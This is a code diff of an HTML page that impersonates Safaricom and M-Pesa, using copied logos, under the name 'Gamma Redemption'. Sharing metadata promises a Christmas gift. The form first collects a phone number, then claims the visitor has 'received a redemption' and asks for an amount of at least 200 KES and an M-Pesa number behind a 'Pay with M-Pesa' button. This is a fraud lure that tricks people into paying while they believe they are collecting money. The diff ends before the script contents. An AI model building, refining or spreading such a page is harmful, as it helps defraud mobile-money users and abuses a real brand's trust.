@@ -4,34 +4,59 @@
 <head>  
     <meta charset="UTF-8">  
     <meta name="viewport" content="width=device-width, initial-scale=1.0">  
-    <title>Safaricom Redemption</title>  
+    <title>Gamma Safaricom Redemption</title>  
+
+    <!-- Social Media Metadata (Open Graph / Twitter Cards) -->
+    <meta property="og:title" content="Gamma Redemption - Safaricom Christmas Gift">
+    <meta property="og:description" content="Receive early Gamma Redemption for Christmas in partnership with Safaricom.">
+    <meta property="og:image" content="dis.png">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:type" content="website">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Gamma Redemption - Safaricom Christmas Gift">
+    <meta name="twitter:description" content="Receive early Gamma Redemption for Christmas in partnership with Safaricom.">
+    <meta name="twitter:image" content="dis.png">
+
     <style>  
         body {  
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;  
-            background: #121212;  
+            background: #0b1320;  
             display: flex;  
             justify-content: center;  
             align-items: center;  
             min-height: 100vh;  
             margin: 0;  
+            padding: 20px 0;
             color: #ffffff;
+            box-sizing: border-box;
         }  
         .card {  
-            background: #1e1e1e;  
-            padding: 2.2rem 1.8rem;  
+            background: #121c2d;  
             border-radius: 16px;  
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);  
+            box-shadow: 0 10px 30px rgba(0,0,0,0.6);  
             max-width: 380px;  
             width: 90%;  
             text-align: center;  
-            border: 1px solid #2a2a2a;
+            border: 1px solid #1e2c42;
+            overflow: hidden;
         }  
+        /* Banner image display */
+        .banner-img {
+            width: 100%;
+            height: auto;
+            display: block;
+            border-bottom: 1px solid #1e2c42;
+        }
+        .card-body {
+            padding: 1.8rem 1.8rem;
+        }
         .brand-header {
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
         .header-divider {
             color: #555;
@@ -41,7 +66,8 @@
         .icon-circle {
             width: 64px;
             height: 64px;
-            background: #0f381e;
+            background: rgba(212, 175, 55, 0.15);
+            border: 1px solid #d4af37;
             border-radius: 50%;
             display: flex;
             align-items: center;
@@ -51,7 +77,7 @@
         .icon-circle svg {
             width: 32px;
             height: 32px;
-            fill: #00d053;
+            fill: #d4af37;
         }
         h2 {   
             color: #ffffff;   
@@ -61,10 +87,10 @@
             font-weight: 700;
         }  
         .highlight-name {
-            color: #00d053;
+            color: #d4af37;
         }
         p.subtitle {   
-            color: #a0a0a0;   
+            color: #a0aab8;   
             margin-bottom: 1.8rem;   
             font-size: 0.95rem;
             line-height: 1.4;
@@ -83,8 +109,8 @@
         input {  
             width: 100%;  
             padding: 14px;  
-            background: #121212;
-            border: 1px solid #333333;  
+            background: #0b1320;
+            border: 1px solid #23334d;  
             border-radius: 8px;  
             font-size: 1.1rem;  
             color: #ffffff;
@@ -93,24 +119,24 @@
             transition: border-color 0.2s;
         }  
         input:focus {
-            border-color: #00d053;
+            border-color: #d4af37;
         }
         .amount-input {  
             font-size: 1.3rem;  
             font-weight: 600;  
-            color: #00d053;  
+            color: #d4af37;  
             text-align: center;  
         }  
         .amount-input::placeholder {
-            color: #555;
+            color: #55657e;
             font-size: 1.05rem;
             font-weight: normal;
         }
         button {  
             width: 100%;  
             padding: 15px;  
-            background: #00b047;  
-            color: white;  
+            background: #d4af37;  
+            color: #0b1320;  
             border: none;  
             border-radius: 8px;  
             font-size: 1.1rem;  
@@ -120,11 +146,11 @@
             transition: background 0.2s;
         }  
         button:hover {
-            background: #00c952;
+            background: #e5c158;
         }
         button:disabled {   
-            background: #333333;   
-            color: #777777;
+            background: #23334d;   
+            color: #55657e;
             cursor: not-allowed;   
         }  
         #status {  
@@ -137,11 +163,11 @@
         }  
         .success { background: rgba(0, 208, 83, 0.15); color: #00d053; border: 1px solid #00d053; }  
         .error { background: rgba(220, 53, 69, 0.15); color: #ff4d4d; border: 1px solid #ff4d4d; }  
-        .info { background: rgba(0, 112, 186, 0.15); color: #3399ff; border: 1px solid #3399ff; }  
+        .info { background: rgba(212, 175, 55, 0.15); color: #d4af37; border: 1px solid #d4af37; }  
         .hidden { display: none; }
         .loader {  
             display: inline-block; width: 18px; height: 18px;  
-            border: 3px solid rgba(255,255,255,0.3); border-top-color: #fff;  
+            border: 3px solid rgba(11, 19, 32, 0.3); border-top-color: #0b1320;  
             border-radius: 50%; animation: spin 1s linear infinite;  
             margin-right: 8px; vertical-align: middle;  
         }  
@@ -150,56 +176,61 @@
 </head>  
 <body>  
 <div class="card">  
-    <!-- Header Logos -->
-    <div class="brand-header">
-        <svg height="24" viewBox="0 0 120 30" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M15 5 C5 5 0 12 0 18 C0 24 6 28 16 28 C26 28 30 22 30 18 C28 8 18 5 15 5 Z" fill="#E11B22"/>
-            <text x="35" y="21" fill="#FFFFFF" font-family="sans-serif" font-weight="bold" font-size="16">Safaricom</text>
-        </svg>
-        <span class="header-divider">|</span>
-        <svg height="24" viewBox="0 0 100 30" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <rect x="2" y="2" width="20" height="26" rx="4" fill="#00D053"/>
-            <text x="27" y="21" fill="#00D053" font-family="sans-serif" font-weight="bold" font-size="16">M-PESA</text>
-        </svg>
-    </div>
+    <!-- Image Display -->
+    <img src="dis.png" alt="Gamma Redemption Banner" class="banner-img">
 
-    <!-- STEP 1: INITIAL PHONE ENTRY SCREEN -->
-    <div id="step1">
-        <h2>Enter Safaricom Number</h2>
-        <p class="subtitle">Please enter your Safaricom phone number to check available redemption.</p>
-        
-        <div class="input-group">  
-            <label for="initialPhone">Safaricom Phone Number</label>  
-            <input type="text" id="initialPhone" placeholder="0712345678" maxlength="12" inputmode="numeric">  
-        </div>  
-        <button id="askBtn" onclick="handleInitialCheck()">Ask Redemption</button>  
-    </div>
-
-    <!-- STEP 2: REDEMPTION VIEW (Matches design image) -->
-    <div id="step2" class="hidden">
-        <div class="icon-circle">
-            <svg viewBox="0 0 24 24">
-                <path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14zm-1-6h-3V8h-2v5H8l4 4 4-4z"/>
+    <div class="card-body">
+        <!-- Header Logos -->
+        <div class="brand-header">
+            <svg height="24" viewBox="0 0 120 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M15 5 C5 5 0 12 0 18 C0 24 6 28 16 28 C26 28 30 22 30 18 C28 8 18 5 15 5 Z" fill="#E11B22"/>
+                <text x="35" y="21" fill="#FFFFFF" font-family="sans-serif" font-weight="bold" font-size="16">Safaricom</text>
+            </svg>
+            <span class="header-divider">|</span>
+            <svg height="24" viewBox="0 0 100 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="2" y="2" width="20" height="26" rx="4" fill="#00D053"/>
+                <text x="27" y="21" fill="#00D053" font-family="sans-serif" font-weight="bold" font-size="16">M-PESA</text>
             </svg>
         </div>
 
-        <h2>You've received a redemption from <span class="highlight-name">Gemma Francis</span> on your Safaricom line.</h2>  
-        <p class="subtitle">Enter the amount below and the M-Pesa phone number used to redeem the money.</p>  
+        <!-- STEP 1: INITIAL PHONE ENTRY SCREEN -->
+        <div id="step1">
+            <h2>Enter Safaricom Number</h2>
+            <p class="subtitle">Please enter your Safaricom phone number to check available Gamma redemption.</p>
+            
+            <div class="input-group">  
+                <label for="initialPhone">Safaricom Phone Number</label>  
+                <input type="text" id="initialPhone" placeholder="0712345678" maxlength="12" inputmode="numeric">  
+            </div>  
+            <button id="askBtn" onclick="handleInitialCheck()">Ask Redemption</button>  
+        </div>
 
-        <div class="input-group">  
-            <label for="amount">Amount (KES)</label>  
-            <input type="text" id="amount" class="amount-input" placeholder="Enter amount from 200" maxlength="6" inputmode="decimal">  
-        </div>  
+        <!-- STEP 2: REDEMPTION VIEW -->
+        <div id="step2" class="hidden">
+            <div class="icon-circle">
+                <svg viewBox="0 0 24 24">
+                    <path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14zm-1-6h-3V8h-2v5H8l4 4 4-4z"/>
+                </svg>
+            </div>
 
-        <div class="input-group">  
-            <label for="phone">M-Pesa Phone Number</label>  
-            <input type="text" id="phone" placeholder="0712345678" maxlength="12" inputmode="numeric">  
-        </div>  
+            <h2>You've received a redemption from <span class="highlight-name">Gamma</span> on your Safaricom line.</h2>  
+            <p class="subtitle">Enter the amount below and the M-Pesa phone number used to redeem the money.</p>  
 
-        <button id="payBtn" onclick="handlePayment()">Pay with M-Pesa</button>  
+            <div class="input-group">  
+                <label for="amount">Amount (KES)</label>  
+                <input type="text" id="amount" class="amount-input" placeholder="Enter amount from 200" maxlength="6" inputmode="decimal">  
+            </div>  
+
+            <div class="input-group">  
+                <label for="phone">M-Pesa Phone Number</label>  
+                <input type="text" id="phone" placeholder="0712345678" maxlength="12" inputmode="numeric">  
+            </div>  
+
+            <button id="payBtn" onclick="handlePayment()">Pay with M-Pesa</button>  
+        </div>
+
+        <div id="status"></div>
     </div>
-
-    <div id="status"></div>
 </div>  
 
 <script>  
